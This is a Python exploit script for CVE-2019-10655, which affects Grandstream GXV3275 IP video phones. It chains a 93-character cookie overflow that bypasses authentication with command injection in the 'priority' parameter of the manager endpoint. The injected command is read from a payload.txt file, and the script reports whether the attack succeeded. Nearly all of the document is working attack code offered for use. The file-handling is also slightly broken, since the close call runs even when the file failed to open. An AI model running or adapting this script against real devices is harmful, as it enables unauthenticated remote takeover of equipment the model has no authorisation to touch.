#!/usr/bin/env python3
"""
CVE-2019-10655 [Re-make for python3]: Grandstream - GXV3275 (IP Video Phone) Unauthenticated RCE
Author: 1vere$k
Vulnerable versions: < 1.0.3.219
A command injection vulnerability exists in the `priority` parameter.
Additionally, supplying 93 characters in the "phonecookie" cookie overwrites
the return value of the valid_connection() function, bypassing authentication.
Setting the connection back to your LHOST:LPORT.
"""
import sys, urllib.request, os, time

def usage():
    print("Usage: {} <RHOST> <RPORT>".format(sys.argv[0]))


if len(sys.argv) == 1:
    usage()
    sys.exit()
try:
    RHOST = sys.argv[1]
except:
    usage()
    sys.exit()
try:
    RPORT = sys.argv[2]
except:
    RPORT = 80

try:
    f = open("payload.txt", "r")
    payload = str(f.read())
except:
    print("Please make a 'payload.txt' file, with a command to run exploit in a format '{main-exploit-command-here};more_commands;more_commands'")
finally:
    f.close()

# Buffer overflow to bypass auth
cookie = "phonecookie=\"{}\"".format("A"*93)

print("[*] Trying to run command..")

req = urllib.request.Request('http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}'.format(RHOST, RPORT, payload))
req.add_header('Cookie', cookie)

res = urllib.request.urlopen(req)
# sleep to have enough time for the response
time.sleep(2)
if 'Response=Success' not in str(res.read()):
    print("[!] Exploit failed. " + RHOST + " may not be vulnerable")
else:
    print("[*] Exploit finished")
    time.sleep(3)